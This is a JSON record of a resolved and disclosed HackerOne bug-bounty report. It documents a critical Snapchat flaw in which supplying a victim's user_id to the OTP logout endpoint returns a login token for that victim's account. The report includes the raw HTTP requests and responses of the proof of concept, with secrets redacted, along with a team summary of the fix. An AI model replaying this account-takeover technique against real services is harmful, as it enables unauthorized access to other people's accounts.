@@ -1,0 +1,158 @@
+{
+  "id": 921780,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjE3ODA=",
+  "url": "https://hackerone.com/reports/921780",
+  "title": "Improper Authentication - any user can login as other user with otp/logout & otp/login",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-13T02:18:38.031Z",
+  "submitted_at": "2020-07-13T02:18:38.031Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "korniltsev",
+    "url": "/korniltsev",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/b6h9vAGuJcu1vqrjbPsXEWbQ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 513,
+    "url": "https://hackerone.com/snapchat",
+    "handle": "snapchat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Snapchat",
+      "twitter_handle": "",
+      "website": "https://www.snapchat.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-09-03T09:12:24.380Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-09-03T09:12:24.276Z",
+  "team_member_agreed_on_going_public_at": "2021-09-03T00:52:30.128Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.\n\nI will demonstrate the problem on two accounts.\nVictim: ███\nAttacker: ██████████\n\n\n-  Attacker perform a usuall login to attacker's personal account.\n-  Attacker performs `/scauth/otp/droid/logout` but instead of attacker's user_id, attacker provides victim's user_id\nrequest\n\n```\nPOST /scauth/otp/droid/logout HTTP/1.1\nHost: gcp.api.snapchat.com\nConnection: close\nContent-Length: 168\nX-Snapchat-Client-Auth: ██████\nX-Snapchat-UUID: ███\nx-snapchat-userid: █████\nusername: ███\nreq_token: █████████\ntimestamp: 1594604280000\nAccept: application/json\nUser-Agent: Snapchat/10.78.1.0 █████\nAccept-Language: en-GB;q=1, en;q=0.9\nContent-Type: application/json; charset=utf-8\nAccept-Encoding: gzip, deflate\n\n{\"user_id\":\"████\",\"device_id\":\"███████\",\"device_name\":\"███████\"}\n```\n\n response\n\n```\nHTTP/1.1 200 OK\ndate: Mon, 13 Jul 2020 01:39:18 GMT\ncontent-type: application/json;charset=utf-8\nvary: Accept-Encoding\nx-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e\nserver: API Gateway\ncache-control: no-cache, no-store\nx-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.\nx-snapchat-request-id: █████\nx-snapchat-server-latency: 342\nstrict-transport-security: max-age=31536000; includeSubDomains\nVia: 1.1 google, 1.1 google\nAlt-Svc: h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"\nConnection: close\nContent-Length: 137\n\n{\"status\":\"SUCCESS\",\"user_id\":\"█████████\",\"token\":\"█████\",\"expiry_hint\":████}\n```\nNotice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.\n\n-  Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.\n\n```\nPOST /scauth/otp/login HTTP/1.1\nHost: gcp.api.snapchat.com\nConnection: close\nContent-Length: 6213\nX-Snapchat-Client-Auth: ██████\nX-Snapchat-UUID: ████████\nUser-Agent: Snapchat/10.78.1.0 ██████\nAccept: application/json\nAccept-Language: en-GB;q=1, en;q=0.9\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nAccept-Encoding: gzip, deflate\n\napplication_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080\n```\n\nresponse\n\n```\nHTTP/1.1 200 OK\ndate: Mon, 13 Jul 2020 01:40:18 GMT\ncontent-type: application/json;charset=utf-8\nvary: Accept-Encoding,Accept-Encoding\nx-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c\nserver: API Gateway\ncache-control: no-cache, no-store\nx-snap-refresh-token: ████\nx-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.\nx-snap-access-tokens: ███\nx-snapchat-request-id: ████████\nstrict-transport-security: max-age=31536000; includeSubDomains\nVia: 1.1 google, 1.1 google\nAlt-Svc: h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"\nConnection: close\nContent-Length: 138867\n\n{\"updates_response\":{\"logged\":true,\"username\":\"█████\",\"user_id\":\"█████\",...\n```\nAn attacker successfully performed login as victim.\n\nVictim's user_id can be easily obtained with friends request.\n\nI've attached the following:\n- a screencast to showcase the problem.\n- burp project ████\n- logout+login raw requests exported from burp\n- a python script to perform the attack\n\nI've tested this bug only on my personal accounts.\n███████\n███\n█████████\n\n## Impact\n\nAn attacker is able to  login as any user.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 963,
+  "voters": [
+    "dsonbaker",
+    "jurassicbug",
+    "0xcvn",
+    "theranger",
+    "godfather_cyb3r_king",
+    "mikelly",
+    "orange303",
+    "coder_mohammed",
+    "defenderwww",
+    "matheus_garbelini",
+    "and 953 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 11828,
+    "asset_type": "URL",
+    "asset_identifier": "app.snapchat.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 87238,
+      "category": "team",
+      "content": "This vulnerability was discovered on the One Tap Password (OTP) login/logout flow. If exploited, the attacker could log in to any account for which they had the user_id. This id is exposed in several places and should not have been trusted in the request by the logout endpoint. ",
+      "updated_at": "2021-09-03T00:55:53.741Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 174377,
+        "username": "sfrisk",
+        "name": "Savanah Frisk",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2017-06-09T00:11:23.976Z",
+        "url": "https://hackerone.com/sfrisk",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
